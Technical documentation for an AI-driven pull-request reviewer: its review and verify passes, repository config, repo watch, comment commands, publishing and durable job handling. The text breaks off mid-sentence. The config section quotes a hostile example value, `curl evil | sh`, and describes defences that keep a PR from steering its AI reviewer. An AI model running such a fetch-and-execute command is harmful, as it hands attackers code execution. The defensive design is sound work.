# PR reviewer

`/pr repos` opens a scrollable repository-watch page: directory, state, role, open PRs and publish setting in columns, with ended watches below active ones. `[` and `]` select a repository and reveal its full directory; `s` stops that watch, `r` starts it again with its role, and `R` refreshes. The full daemon report is below the table. Esc closes the page. Long replies from other `/pr` commands and `/reviews` actions offer `F4 full text`, opening the same readable text page without losing the previous screen; short confirmations remain notices.

MendCode reviews pull requests with your own model: a review pass finds candidate defects, a second, independent pass tries to
refute each one, and only the findings it confirms are published as one GitHub review with inline comments. No SaaS, no GitHub
App, no webhook server and no stored token. Code: `packages/daemon/src/pr-review/`.

The [review platform](#review-platform-global-and-personal-reviewers) (durable jobs, remote-effect records, a reviewer registry,
personal reviewers on several devices, review memory, fix modes, stages, stacks, budgets, other forges) is built on top of this.
Its section gives a status for each part: the daemon runs all of them, on GitHub and, through their adapters, on GitLab and
Gitea / Forgejo ([providers](#providers) lists what those two lack).

To set it up for a team (the hosted workflow, an always-on server with personal reviewers on laptops, what happens while a laptop
is off or asleep, troubleshooting), see [PR reviewer: team setup](pr-review-setup.md).

## How a review works

1. **Context.** The diff of `base...head` and, for every symbol a hunk touches, its callers and callees from the [code graph](code-graph.md)
   (depth 2, at most 12 each). No vector index: the graph gives the blast radius, the child reads files with its own read-only tools.
   The context stays inside half of `budget.context_tokens` (200,000 when unset), which bounds one call, not the PR's total; callers
   are cut first, then the largest files' diffs, and the summary says so. A diff that still does not fit one call is reviewed in
   parts of whole files (at most 12), one review call each. Their candidates are merged before one verify pass, and a stopped job's
   checkpoint names its progress (`analysis 3/5`).
   Without a graph index the review uses the diff alone and says so. The pull request's title and description, and the issues
   it closes with GitHub's keywords (`Fixes #12`, at most three, each read with one `gh api` call), go in too, as untrusted data,
   for the pre-merge checks.
2. **Review pass.** One child session in plan mode (the read-only `explore` agent, no edits) answers with findings as JSON
   (path, line on the diff's new side, severity, category, summary, detail, `file:line` evidence, an optional suggestion). An invalid
   answer gets one repair turn, then the review fails (`[PR_REVIEW]: invalid findings`): prose never becomes a finding. A finding on a
   line the diff does not show on its new side is dropped. The same answer carries the **walkthrough**: an overview, the changed
   files grouped by layer, a Mermaid sequence diagram when the change alters how components call each other, the change type,
   the merge risk with its reason, and the pre-merge checks (Title, Description, Linked issues, Out of scope; passed, warning or
   failed). It is a description, not a claim: a group or check that does not fit is left out and an invalid walkthrough never
   fails the review.
3. **Verify pass.** A fresh child, never the one that found them, is told to refute each finding (at most 10 per turn): `confirmed`,
   `plausible` or `rejected`. Only confirmed findings are published; the `strict` profile also publishes plausible ones, marked as such.
   A finding the verifier did not judge counts as rejected; a verifier that fails publishes nothing and the summary says so.
4. **Merge risk floor.** The review pass judges the risk before anything is verified, so the risk is never below what the
   confirmed findings show: a confirmed critical finding makes it high, a major one at least medium, and the reason starts with
   the count ("1 confirmed critical finding."). A rejected finding raises nothing.
5. **Rank and cap.** Confirmed first, then critical, major, minor, then category; at most `cap` (8) are shown and the rest are one line,
   "And N smaller notes not shown", in the summary.

## Repository config

`.mendcode/review.yaml` (YAML, every key optional):

```yaml
preset: balanced        # balanced (the defaults below) | quiet | strict | on-request | autofix; the file's own keys go over it
enabled: false          # nothing is posted until this is true on the base branch (a watch still reviews into its own session)
profile: normal         # quiet (critical and major only) | normal | strict (also maintainability, and plausible findings)
cap: 8                  # 1..30 inline comments per review
paths:                  # extra instructions for files matching a glob; only globs the diff touches reach the prompt
  - glob: "packages/daemon/**"
    instructions: treat races as major
ignore: ["dist/**", "**/*.generated.json"]
checks: ["bun test"]    # commands the verify pass gets the output of (below)
fixes: false            # whether `@mendcode fix` may push a commit to the PR branch
triggers: { opened: true, synchronize: true, ready_for_review: true, drafts: false }
budget:
  tokens_per_pr: 1000000  # per PR head: input not served from the provider's cache, plus output; null = no internal cap
  tokens_per_diff_token: 8  # the cap grows with the diff: 150,000 + 8 per diff token, never above tokens_per_pr; 0 = always tokens_per_pr
  context_tokens: 200000  # what one call may carry (half of it is the diff and graph context); unset: 200,000
  on_quota: wait          # wait | stop at a real provider quota (platform module, below)
  max_wait_minutes: 360
cooldown: { pr_minutes: 10, repo_per_hour: 20 }   # automatic reviews only; /pr review is never limited
reviewers: all          # all (every PR) | requested (only PRs that request a review from, or are assigned to, the reviewer's gh login) | [alice, bob] (only their @mendcode comments are taken; every PR)
publishers: maintainers # maintainers (gh login with write access) | [alice, bob] (these logins, contributors included) | anyone
# The review platform's keys (see "Review platform" below), used by the daemon's reviewer:
mode: auto              # auto | on-request | labels
filters: { labels: { include: [], exclude: [] }, branches: { include: [], exclude: [] }, authors: { include: [], exclude: [], bots: false }, paths: [] }
coverage: incremental   # incremental | full (an audit of the whole repository is only ever explicit)
fix: { mode: review, push: false, personal: false, max_rounds: 3 }   # review | fix-once | fix-loop
phases: { mode: dynamic, list: [], max_rounds_without_progress: 2 } # none | fixed | dynamic
template: { sections: [], tone: neutral, language: English }        # tone: neutral | concise | detailed; language: a name or auto (below)
backlog: { max_prs: 10, window_days: 30 }   # open PRs reviewed when a watch starts (below); 0..50 and 1..365; max_prs: 0 = none
```

The base branch's file decides everything a pull request could abuse: `enabled`, `checks`, `budget`, `ignore`, `profile`, `cap`,
`fixes`, the triggers, the cooldown, `reviewers`, `publishers`, `backlog` and `template.language`. The logins in `reviewers` and
`publishers` follow the checkout's forge: GitLab and Gitea usernames may hold `_` and `.` (not a trailing `.`), and a GitHub login
only letters, digits and `-`. A PR's own file may only add path instructions, so a PR that adds `checks: [curl evil | sh]` runs
nothing. A watching reviewer reads these from the base branch's current tip on `origin` (fetched into `FETCH_HEAD` only), not
from the PR's recorded base or the local checkout: a PR opened before the file was added still follows it. An invalid file is named in the summary (`[PR_REVIEW]: config line 2: …` or the field) and the defaults (or the base
branch's file) are used.

`checks` run once per review, from the base config only, in the [OS sandbox](sandbox.md) with no network: the PR's checkout is
read-only, only a scratch and the temp directories are writable, and the verifier reads their exit code and last 6,000
characters. Without a sandbox backend they do not run, and the verifier is told why; they never run unconfined.

### Review language and session notices

`template.language` (default `English`, a language name such as `Español`, or `auto`) is the language of the reviewer's prose:
summary, walkthrough, findings, checks and template sections. Every review, verify, re-check and fix prompt pins it, and so does
an `@mendcode explain` reply. That holds whatever the pull request, its comments or the user's own harness settings use, so all
reviews of a PR read in one language; the template's labels stay English. On every engine it reaches the child the same way:

- A Claude Code child also gets it as `--settings '{"language":"…"}'`, the flag layer Claude Code loads above the user's
  `~/.claude/settings.json`, whose `language` would otherwise reach a public review.
- A Codex child gets it as a developer message (`-c developer_instructions`).

Nothing is written to any settings file. Only the repository sets it: a personal or task layer that changes it is refused as
`template.language`.

`auto` is the language of the PR's author, judged once per PR from its title and description. A small deterministic detector
reads the script (Cyrillic, CJK, Arabic and others) and, for Latin text, the function words of Spanish, Portuguese, French,
German, Italian and Dutch. A short, empty, mixed or unclear text is English. The result is kept with the PR's review state and
on the review itself, so later pushes, an edited description and the hosted runner keep the same language.

The reviewer's notices to the watching session (a review published, a fix pushed, a job stopped) are recorded in its transcript as
notices: stored and shown, with no model call. Set `experimental.pr_review_prompts: true` to have the session's model answer each
one instead. In the transcript the pull request in a notice (`owner/repo#N`) is a terminal link to it on GitHub, and a `review <id>`
after it links to that review (links follow the `hyperlinks` setting). A job id shows by its last eight characters with a
`/reviews open <those characters>` hint, and the queue row keeps the pull request and what happened to it. A watch that has not ended, a held notice or a job that runs later (queued, waiting for a time, a claim or a quota
reset) keeps a detached daemon from stopping itself when idle, and a closing terminal hands it to a detached daemon; the
`daemon.status` answer names it in `keepAlive.standing`.

## Learnings

`.mendcode/review-learnings.md` holds one bullet per thing the maintainers taught the reviewer ("prefer early returns", "a
missing `await` on `store.flush` is intended"). It is read from the base branch, cut at a bullet boundary to 4 KB, and goes into
the review prompt. A PR cannot teach the reviewer to ignore its own bugs: a learning proposed on a PR counts once it is merged.
Both files are versioned with the code, reviewable like any other change, never a vendor's memory.

## On your machine: `/pr review` and the repo watch

It is **off by default**: it reaches the network through `gh` (or a [GitLab or Gitea adapter](#providers)) and spends model calls, so it needs `experimental.pr_review`
(`/pr on`, which also turns on [PR watch](pr-watch.md); `/pr off` turns both off; or `/experimental pr_review on` alone), allowed from the `balanced` tier up ([tiers](tiers.md): feature `pr_review`, mode `permit`; off with no
tier). Local sessions only; remote and peer clients are refused.

- `/pr review [pr]` reviews one pull request now (the current branch's when omitted), even when the repo config is off; posting still
  needs `enabled: true`. A head already reviewed with the same config is answered at once ("already reviewed at …, so nothing was
  run"), before anything is spent; `/pr review [pr] full` (the tool's `full: true`) reviews it again whole. A plain `@mendcode review` on such a head is
  skipped the same way.
- The `pr_review` tool is the model's way to do the same. It has two actions:
  - `review` follows the session's permission mode like a command: full access runs it, other modes ask ("Review a pull
    request"), and a grant for the session or always holds. The repository's filters and the PR claims apply, and the review is posted only as
    `/pr publish` allows; otherwise it stays in the session.
  - `status` lists the reviewer's jobs of the checkout.

  It is not offered to remote turns or to review children. A session never posts `@mendcode` (or anything else) from your account
  to start a review.
- `/pr watch-repo` watches the session's repository: about once a minute `gh pr list` reads the open PRs, and a new PR or a new head
  (a draft once it is ready, unless `triggers.drafts`) starts a review. Nothing changing means no model call.
- **Open PRs when a watch starts.** This applies when a watch starts, after a daemon restart, and after a pause or outage.
  MendCode queues a review (trigger `backlog`) for the open PRs whose current head has no review yet. A review by this login or by
  an allowed publisher counts, hand-written reviews included. They go newest first, at most `backlog.max_prs` (default 10), and
  only PRs updated within `backlog.window_days` (default 30). A PR whose head already has a review stays as it is. The
  `/pr watch-repo` answer lists what it queued and every PR it skipped, with the reason. `max_prs: 0` restores the old baseline,
  where the PRs open when the watch started were never reviewed.
- `/pr unwatch-repo` stops it, `/pr repos` lists the watches. The watch belongs to the daemon, not
  to a terminal or an open session: it keeps reviewing with every terminal closed and after a daemon restart (`watches.json`), as
  long as the machine and its daemon run. A sleep or a network outage does not end it: it resumes by itself and catches up
  (**Outages and sleep**, below). To review with the machine off, use the [hosted workflow](#on-githubs-runners-the-hosted-workflow)
  or an always-on server ([team setup](pr-review-setup.md)).
- Cooldown, on by default: a PR is reviewed again only `cooldown.pr_minutes` (10) after its last automatic review; pushes in between
  are one review, at the newest head, when the time is up. A repository starts at most `cooldown.repo_per_hour` (20) automatic reviews
  an hour; over it the session is told once an hour and the waiting PRs run as the hour frees up. `/pr` lists how many wait.
- Roles: `/pr watch-repo all` reviews every PR (one reviewer for the whole repository, on a server for example). `/pr watch-repo
  requested` reviews only the PRs that request a review from the daemon's own `gh` login or are assigned to it, and the PRs that
  `.mendcode/reviewers.yaml` routes to that login's personal reviewer by area or label. Each developer runs their own reviewer, and
  GitHub's reviewer and assignee fields (or the registry) decide who reviews what. Being requested starts a review by itself. Without a
  word, the repo config's `reviewers` decides; running the command again with the other word changes the watch in place. The login is
  read once with `gh api user`.
- Before the first post to a repository the session is asked once: `/pr publish on` posts that review (as found, no second model
  call) and later ones, `/pr publish off` keeps reviews in the session as notices.
- Protocol: `pr.review` (`sessionId`, `action`: `watch-repo | unwatch-repo | review | list | publish-on | publish-off`, `directory`, `pr`, `role`: `all | requested`).
  The schema also accepts the platform's actions (`status`, `audit`, `job-pause`, `job-resume`, `job-cancel`, `job-retry`,
  `take-over`, `release`, `config-show`, `config-preview`, `config-apply`, `config-revert`, `config-history`, with `jobId`,
  `reason`, `scope`, `patch`, `version`), and the daemon answers them (see the review platform below). `audit` has no slash command;
  it is reached through this action only.

A review is a durable job of the repo watch (`<dir>/pr-review/jobs.json`), at most two at once by default (see
[Concurrency](#concurrency)). The head is fetched into `FETCH_HEAD` only and checked out
detached in a throwaway worktree under `<dir>/pr-review/worktrees/` (removed afterwards), so your branches and checkout are never
touched. The children are hidden sessions on the `explore` agent in plan mode, on the owner session's model; an approval they ask
for is refused. They read with `read`, `grep`, `glob` and the graph tools; `shell` is not offered to them, since plan mode refuses
every command (a model that read with `git show` got only refusals and reported its repository reads as denied). Nor are skills or
instruction files (`AGENTS.md`, `CLAUDE.md`, yours or the PR's): the review prompt is the whole brief, a PR cannot steer its own
reviewer, and a user skill once sent a child to files outside the checkout, so its read was refused as a whole. A Claude Code review
child runs with `CLAUDE_CODE_DISABLE_CLAUDE_MDS` and `CLAUDE_CODE_DISABLE_AUTO_MEMORY` and `--setting-sources user`, so the PR's
own `.claude/` settings and hooks never load; a fix session gets `--setting-sources user` too. A Codex child (a `codex:` model) starts
its `codex app-server` with `-c` overrides for that process only: a review child gets `project_doc_max_bytes=0` (no `AGENTS.md`,
`AGENTS.override.md` or fallback file of the checkout), the `memories` feature off (`memories.use_memories` and
`memories.generate_memories` false too) and `skills.include_instructions=false`; a review child and a fix session both mark each
directory from the worktree up to its `.git` as an untrusted project (`projects={...={trust_level="untrusted"}}`), so the
checkout's `.codex/config.toml`, hooks and rules stay disabled even when you trust the repository the worktree belongs to (Codex
hands a worktree that trust), and a fix session's checkout skills are disabled by path (`skills.config`). Codex has no switch for
your own `~/.codex/AGENTS.md`, so a Codex review child still gets it; `CODEX_HOME` is never moved. This is a known limit, not an
oversight: in codex-cli 0.162.1, `codex debug prompt-input` still renders that file with `project_doc_max_bytes=0`,
`project_doc_fallback_filenames=[]`, `instructions=""` or `user_instructions=""`, its config schema has no
`include_user_instructions` key (only the permissions, apps, collaboration-mode and environment ones), no feature flag covers it,
and `codex app-server` has no such option. The only other way, a separate `CODEX_HOME`, needs your login copied or moved, which
MendCode never does. A read outside the
checkout is refused with what may be read instead. A push reviews only the commits since the last reviewed head (the whole PR after a force push) and re-checks the
published findings in the files it changed, whether their lines were rewritten, moved, or left as they were while code next to
them changed (a fix often inserts the missing call above the flagged line): one that no longer reproduces gets its thread resolved.
GitHub lets only writers and the PR author resolve a thread; where it refuses (a publisher with read access), one reply in the
thread says `Fixed in <head>` instead. An explicit review (`/pr review`, `pr_review`, `@mendcode review`) re-checks every open
finding, also on a head reviewed before; when it finds nothing new it posts no second review, and `@mendcode review` gets a reply
naming the head and the findings still open. A review counts as a review of a head only when it is a MendCode review (it has the
`## MendCode review` summary or MendCode's marker) when it comes from your own login: the empty review GitHub records for a thread
reply (`Fixed in <head>`) or a note written by hand is not one. A missing or logged-out `gh`
pauses the watch with one notice. A paused watch tries again every 5 minutes, and at the first tick after the daemon starts, and
resumes by itself with a second notice; `/pr watch-repo` tries at once. It keeps what it saw, so the PRs opened, the heads pushed
and the `@mendcode` comments written during the pause (every page of them) are handled when it resumes, not taken as a new
baseline. Before, a paused watch waited for `/pr watch-repo`, which took the PRs open at that moment as the baseline.

**Outages and sleep.** A listing that fails for any other reason backs off: the next tick lists again, then the gap doubles (2,
4, 8 minutes) up to 15 minutes, and the watch resumes by itself at the first listing that works, reading the PRs opened, the heads
pushed and the `@mendcode` comments written meanwhile (the platform's catch-up runs too, as after a pause). Failing time is counted
awake: the daemon compares the wall clock with a monotonic clock that stops while the machine sleeps, and never counts more than two
backoff gaps between two failed listings, so a laptop asleep with its lid closed (dark wakes without network included) adds
nothing. A network or forge outage (no route, DNS, timeouts, 5xx, rate limits) or an error that says neither never ends a watch:
after 15 awake minutes the session hears of it once, and again when the watch lists its PRs again. Only a permanent error (the
repository gone or renamed away, a 404; access revoked, a 403 that is not a rate limit; a checkout whose remotes no longer point at
GitHub) for 15 awake minutes in a row ends the watch, with that error in the notice; `/pr watch-repo` starts it again. Before, 15
wall-clock minutes of any failure ended it, so closing a laptop for a quarter of an hour stopped every review until someone ran
`/pr watch-repo` (seen live, ~4 h asleep).

Every notice (a review's findings, a failure, an `@mendcode` comment that was not answered and why) goes to the session only while
it is free, so it never cuts into your turn or your queue. One that arrives during a turn, behind queued messages, after a cancel or
while the session is paused is held, in order, and offered again when the session goes idle (and every minute): several held ones
arrive as one message, the newest 20 per session are kept, and they survive a daemon restart in `<dir>/pr-review/outbox.json`.
Before, such a notice was dropped: two `@mendcode review` comments two seconds apart showed only the first one's notice.

State: `<dir>/pr-review/watches.json`, `<dir>/pr-review/outbox.json`, `<dir>/pr-review/<owner>/<repo>/<n>.json` and the
platform's `jobs.json`, `effects.json`, `accounting.json`, `ownership.json`, `device.json` and `profiles/` (0600, atomic). Which events queue a review is read from the checkout's own
`.mendcode/review.yaml`; whether it may post is read from the PR's base.

## Many reviewers on one repository

Anyone can point a reviewer at a public repository, so the repository decides who may post, on its base branch:

- **Who posts:** `publishers` in `.mendcode/review.yaml`. `maintainers` (the default) posts only from a `gh` login with write
  access; a list (`publishers: [alice, bob]`) names the logins that may, contributors without write access included; `anyone` lets
  every reviewer post. A reviewer that may not post keeps its reviews in its own session and answers no `@mendcode` comment, so 300
  people watching one repository never flood it. The hosted workflow is the repository's own and always may. A modified client
  can ignore all of this; GitHub's interaction limits and blocking are what stop it.
- **One review per head:** before posting, a reviewer reads the PR's reviews; a MendCode review of the same head by another
  publisher (a listed login, or an owner, member or collaborator for `maintainers`, or the hosted workflow) makes it stand down,
  and the review stays in its session. Two reviewers that start at the same moment both spend tokens, but only the first posts.
- **One answer per comment:** every reply carries `<!-- mendcode:answers=<comment id> -->`; a reviewer that finds another
  publisher's answer to the same comment does not answer.
- **Addressing one reviewer:** `@mendcode review @alice` (any command, the login right after the command word) is answered only by
  the reviewer running as `@alice`; the hosted workflow leaves it to her. A comment addressed to no one is answered by reviewers
  of every PR (`/pr watch-repo all`) and by a `requested` reviewer when the PR requests it. GitHub's own review request is the
  other way to ask one developer's reviewer: requesting `@alice` starts her `requested` reviewer.
- **Who may ask:** `reviewers` as a list (`reviewers: [alice, bob, carol]`) is the team whose `@mendcode` comments are taken; a
  comment from anyone else is not answered, not kept and not told to the session (the hosted workflow skips it). PRs are reviewed
  as with `all`. The list only narrows: a listed login still needs write access to run a command, and it does not make anyone a
  publisher. Three separate questions: `reviewers` says who may ask, `publishers` whose reviewer may post, write access who may
  run a command. `all` and `requested` keep their meaning and take anyone's comment.
- **Who may run a command:** write access, read from GitHub. A contributor reviewer listed in `publishers` cannot read another
  user's permission (GitHub needs push access for that), so it accepts the comment's author association instead: owner, member or
  collaborator.

The usual setups: one reviewer of every PR (the hosted workflow, or one `/pr watch-repo all` on a server) and everyone else
`requested`; or every developer `requested` and no shared reviewer. Step by step, with the trade-offs for laptops that are often
off: [team setup](pr-review-setup.md).

A repository that has not set `enabled: true` is still reviewed by a watch you started, into your own session only: nothing is
posted and you are not asked to post.

## Commands in a pull request

A comment whose line starts with `@mendcode` and a command word runs it; quoted lines, code blocks and MendCode's own replies (they
carry `<!-- mendcode:reply -->`) never do. Only someone with write, maintain or admin access is answered with anything but one reply
saying only maintainers can run it. Each answer goes in the same thread. Every command is checked in one order: the commenter's
permission first, then the repository's filters, then the reviewed head (and claims). So someone without write access always
gets the one refusal, whatever state the head is in.

A comment from the daemon's own login is its owner's request. Its `@mendcode review` runs like `/pr review`, and its `@mendcode fix`
still needs that login's write access. Anything it is refused is said in the session only, never posted on the pull request.

| Command | What happens |
|---|---|
| `@mendcode review` | Reviews what is new: when a full review of an earlier head exists and the config is unchanged, only the commits since it (like a push), re-checking the open findings; otherwise the whole PR. Even a paused PR. A head that already has a review by your login or a counted publisher is not reviewed again: one reply links that review and says "the next push will be reviewed", and the next head is reviewed. A PR the repository's filters keep out of review (an excluded label, branch or author, a bot, `filters.paths`, a draft without `triggers.drafts`, a personal profile's narrowing) gets one reply naming the filter instead, and nothing runs. |
| `@mendcode review full` | Reviews the whole PR, like `/pr review`. |
| `@mendcode pause` / `resume` | New pushes are not reviewed until `resume`; `review` still works. The reply carries `<!-- mendcode:paused=1 -->`, so a hosted runner reads it back. |
| `@mendcode explain [question]` | As a reply to one of MendCode's review comments: a read-only child reads the code and answers about that finding, and may say it is wrong. |
| `@mendcode fix [what]` | Held to the same filters as `@mendcode review` (one reply naming the filter). Needs `fixes: true` on the base branch, and a branch in this repository or a fork that allows edits from maintainers. A separate session (the default agent, your normal permission mode, its approvals come to you) edits a throwaway worktree at the head; the base config's checks run on the result; one commit is pushed to the PR's branch only if they pass, never with force. A failing check, no change, or a branch that moved meanwhile pushes nothing and the reply says why. Local daemon only: the hosted workflow's token cannot push. |
| `@mendcode learn <text>` | Replies with the line to add to `.mendcode/review-learnings.md` and the commit to make on the base branch; a learning counts once merged there, so a PR never teaches the reviewer by itself. |

The local repo watch reads new comments of the watched repository with two `gh api` calls per poll (issue comments and review
comments since the last poll) and answers with your own `gh` login, once you allowed posting to that repository (`/pr publish on`);
until then the session is told which command waits. The hosted workflow answers comment events itself.

A command is kept with the watch (`commands` in `watches.json`) from the poll that reads it until it is answered, so none is lost:

- Without `/pr publish on` it waits, and the session is told once. `/pr publish on` answers the waiting ones at once.
- When the repository does not let your login post (`publishers`, write access), it is tried again every 10 minutes while posting is
  allowed, and the session is told once.
- A command whose job never ended (a daemon restart, a full queue) runs again at the next poll. One comment never runs twice at
  once, and a reply your login already posted for it (`<!-- mendcode:answers=N -->`) counts as answered, so a crash right after a
  post does not answer twice.
- Every reply of the local daemon is an effect in the effects ledger (kind `reply`, one per answered comment): one already sent is not
  sent again, and right before the write the PR is read for an answer to that comment (this login's, from a crash or another device,
  or another publisher's); one found counts as the answer and nothing is sent.
- The filters on `@mendcode review` and `fix` are the local daemon's; the hosted workflow does not check them on a comment yet.
- A command of a PR that closed is dropped; at most 100 are kept per repository, the oldest go first.
- An `@mendcode review` whose PR head already had a submitted review by your login or a counted publisher (MendCode's or written
  by hand) before anyone asked gets one reply in its thread linking that review (`…/pull/N#pullrequestreview-ID` on GitHub),
  sent once through the effects ledger like every reply; nothing is reviewed again and no review is posted. The request is kept
  on the PR (`asked` in `watches.json`), so it survives a restart. The PR's next head is reviewed for it (trigger `comment`), even
  with `triggers.synchronize` off. It is dropped when the PR closes. A request answered by
  its own review (it waited for a running job of that head, or its job posted before a restart) gets no extra reply. Someone
  without write access gets the usual refusal instead.
- The answer to `/pr publish on|off` belongs to the directory: a stopped watch stays in `watches.json` next to the running one, and
  every record of the directory holds the answer (before, it went to the first record, a stopped one, and the running watch kept
  waiting). A new watch of the directory keeps it.
- A watch saved before commands were kept, that never posted, reads its comments again from the watch's start once: commands that
  were dropped for a missing `/pr publish on` wait like new ones. A watch that did post keeps its marks.

**Follow-ups.** While a repository is watched, a check that fails on a head MendCode reviewed and posted on gets one comment with its
cause: the failed job's error lines from `gh run view --log-failed` (bounded, at most three checks). The same failing set on the same
head is explained once; a new failure or the same one on a new head is explained again. The checks of one PR are read at most every
five minutes. The hosted workflow has no follow-ups.

## On GitHub's runners: the hosted workflow

`github install --hosted` writes a workflow that reviews each pull request on `ubuntu-latest` with the repository's own model
secret and `GITHUB_TOKEN`; the runner keeps no state, it reads the markers of the earlier reviews. Setup, secrets, the pinned
release and what happens on a fork: [GitHub automation](github.md#hosted-pr-reviewer). It does not need
`experimental.pr_review` (that switch is the local daemon's): it runs only once a maintainer has committed the workflow and its
secret, and posts only with `enabled: true` on the base branch. A hosted review runs no `checks`.

## Publishing

One `POST /repos/{owner}/{repo}/pulls/{n}/reviews` with event `COMMENT`, never `REQUEST_CHANGES`: the summary as its body and one
inline comment per new finding on the diff's new side, with a ```suggestion block when the fix stays on the commented lines. Each
review carries `<!-- mendcode:review head=SHA -->` and each comment `<!-- mendcode:f=ID -->` (the finding's sha1 of path, line,
category and summary): a finding already posted is never posted again, the same head is never reviewed twice, and a later head with
nothing new posts nothing. A comment GitHub refuses (422) moves into the summary and the request is sent once more; any other failure
posts nothing and the findings stay in the session. Over `budget.tokens_per_pr` the review says it stopped and publishes only what
it confirmed. The budget counts input the provider did not serve from its cache, plus output: a child that
reads files resends its conversation on every step, so cache reads would stop an ordinary PR before verification (one live review
of an 8-file PR read 207,343 input tokens in its first pass). The cost line shows the cache reads apart. A review the budget
stopped before verifying says so in its verdict, never "No findings".

The verification line under the verdict says what the separate pass did, so "No findings" never claims a check that did not run:
"the review pass raised no candidate findings, so no separate pass was needed" when there was nothing to verify; "a separate
pass checked N candidates again and confirmed none" when every candidate was dropped; "every finding was checked again by a
separate pass (N candidates judged)" when some were kept; and for a stopped review, that it is incomplete and that nothing
unverified is published. Candidates outside the diff that were left out are counted on the same line.

### What a review looks like

The summary (`publish.ts` `reviewBody`) starts with `## MendCode review`, the verdict (`**3 findings** · 🔴 1 critical · 🟠 2 major`,
or `**No findings**`), the head and whether only the commits since the last review were read. Then the merge risk and its reason
(`**Merge risk:** 🟡 Medium · …`) and the change type with the review effort, the model's summary, one table of every finding worst
first, each linked to its lines at the reviewed head, the **Walkthrough** folded (overview, a `Layer / files | Summary` table and the
sequence diagram), the **Pre-merge checks** folded with their counts in the title (open when one did not pass; absent when the
review had no title or description to check), the findings GitHub would not take inline, and a folded
**Review details**: files reviewed, changed lines and an estimated review effort (1 to 5, by changed lines), the profile and cap,
how many candidates the verify pass left out, the tokens spent, and the notes (no code graph, what the budget cut). A last line
lists the `@mendcode` commands.

An inline comment (`commentBody`) leads with `**🟠 Major** · **Correctness** · confirmed by a second pass` (or `plausible, not
confirmed`), then the problem in bold, why, a ```suggestion block when the fix stays on the commented lines, and folded:
**Evidence** (the `file:line` references) and **Prompt for an AI agent**, which tells an agent to treat the finding as data, check it
against the current code and change nothing when it no longer holds. Marks are plain characters, never hosted images, so the review
reads the same on GitHub Enterprise and in a mail notification. Besides the id marker each comment carries the finding itself as
`<!-- mendcode:data BASE64 -->`, which a hosted runner reads back exactly whatever markdown the text holds (comments written before
it are read from their first line).

## Review platform: global and personal reviewers

One review experience with two kinds of reviewer: the repository's **global** reviewer (team rules and the repository's context,
on a server or any machine) and a developer's **personal** reviewer (their own MendCode, with the context and memory they allow).
It is built as modules under `packages/daemon/src/pr-review/`, wired into the daemon's PR reviewer (`service.ts`, `run.ts`,
`control.ts`), each with its own tests. Cross-module scenarios are in `packages/daemon/test/pr-review-platform-*.test.ts`, and
`pr-review-platform-service.test.ts` runs them end to end through the service with the real review run. They use temp directories,
temp git repositories, a fake `gh` and scripted model turns with no network, so they are contract evidence, not live evidence.

Live evidence (2026-10-30): the daemon's GitHub path ran in a private sandbox repository with a Claude model through Claude Code.
That run covered reviews and inline findings, no duplicates after SIGKILL and SIGTERM restarts, the `@mendcode` commands and
filters, automatic fixes and the review of the pushed fix, take-over and release, a budget checkpoint and its resume, a stacked PR,
two daemons as one personal reviewer, and the repository's review language. The GitLab and Gitea daemon flows ran against local
instances with scripted review children ([providers](#providers)). Tests only: claim renewal after an hour, the
[outage and sleep rules](#on-your-machine-pr-review-and-the-repo-watch), and the re-check of a fix that inserts a line next to its
finding. Also tests only, all added after the live runs: the open-PR backlog, enforced capabilities, forge logins, the kept
`@mendcode review` request, turn stalls and diffs in parts, `template.language: auto`, the `pr_review` tool and `review_config
setup`. What each topology gives up: [team setup, limits](pr-review-setup.md#limits).

| Part | Status |
|---|---|
| Durable jobs (running → done, failed, stale, checkpointed), restarts, retries, the effects ledger, reviewer markers | **In the daemon** |
| Outages and sleep: failing time counted awake, network errors never end a watch, transient job failures spend no attempt | **In the daemon** (the repo watch, and one watched PR through `pr_watch`) |
| Eligibility (`mode`, `filters`), fresh permission reads before writes | **In the daemon** (the watch's poll; `@mendcode fix` pushes) |
| `.mendcode/reviewers.yaml` routing, a personal reviewer that waits for its own daemon, device leases, PR claims (best-effort) | **In the daemon** |
| Configuration layers, personal profiles, the configuration actions and the `review_config` tool | **In the daemon** |
| Review memory by scope | **In the daemon** (the daemon's memory reader) |
| `fix.mode` fix-once and fix-loop, take-over and release | **In the daemon** |
| Stages, stacks, budgets with checkpoint and resume, quota waits, accounting | **In the daemon** |
| Audit of the whole checkout | **In the daemon**, session only: a `pr.review` `audit` action, no slash command |
| The `/reviews` page (also `/pr dashboard`) | **In the TUI and the daemon** (`status`, the job actions, `config-show`) |
| GitLab and Gitea / Forgejo | **In the daemon** through their adapters: watch, review posts, `@mendcode` commands, claims and fixes; no check follow-up or hosted runner, no thread resolution on Gitea ([providers](#providers)) |

### Jobs, restarts and remote effects

Every review the watch starts is a job in `<dir>/pr-review/jobs.json` (0600, written atomically on every change), not an
in-memory queue. A job is one reviewer's work on one head, base and config version: the same event twice is the same job, a
listing older than one already read changes nothing, and a push while a job of the PR runs marks that job superseded (it ends
`stale` and its result is not posted) and queues the new head. A daemon that stops while a job runs finds it at the next start,
back in line with the interrupted attempt counted. A failed job is retried with exponential backoff and full jitter (up to 30
seconds at first, doubling, never more than 30 minutes) and is `failed` after 5 attempts; a new head or `/pr review` starts a new
one. A failure that is not the job's own spends no attempt: one whose error names the network or the forge's servers (no route,
DNS, a timeout, a 5xx, a rate limit), one whose attempt the machine slept through (the wall clock ran ahead of the monotonic one),
or one whose error says neither while the forge cannot be reached either (one `gh api rate_limit` read; GitLab and Gitea: a
listing). Such a job waits (15 to 30 s at first, doubling, at most 15 minutes) and runs again, for up to 24 hours after its first
such failure; past that its failures count as above. The session hears of the first failure, not of every wait. Each failure or
stop notice names the repository, the PR, the head's first 12 characters, the reason, the next retry time (UTC) and the attempts
left, and ends with a `Head: <sha12>` line.

A review, verify or fix turn has no fixed time limit, since a large PR's review can rightly take long. A turn is stopped as
stalled after 10 minutes with no event from the model. A fix session waiting for your approval is not idle, and every turn has a
hard cap of 2 hours. A stalled turn keeps the job's work in its checkpoint and is retried with backoff from there. A stall is not
a network outage, so each of its retries spends an attempt. A model child that never answers its start handshake (Claude Code's
`no answer to initialize`, seen under heavy load) is retried the same way. A turn that fails with the network's or the forge's words (a timeout,
a 5xx) is a transient failure, as above. A job only moves
along fixed transitions: a finished job never runs again by itself, and nothing becomes `done` without
running. The newest 500 finished jobs are kept. A damaged file is set aside (`jobs.json.corrupt-<time>`) and the next poll reads the
open PRs again. Each poll lists every open PR (up to 1,000), so after a pause or downtime the PRs opened, the heads pushed and the
reviews requested meanwhile are found from GitHub's current state, not from events that were missed. A daemon start counts as a
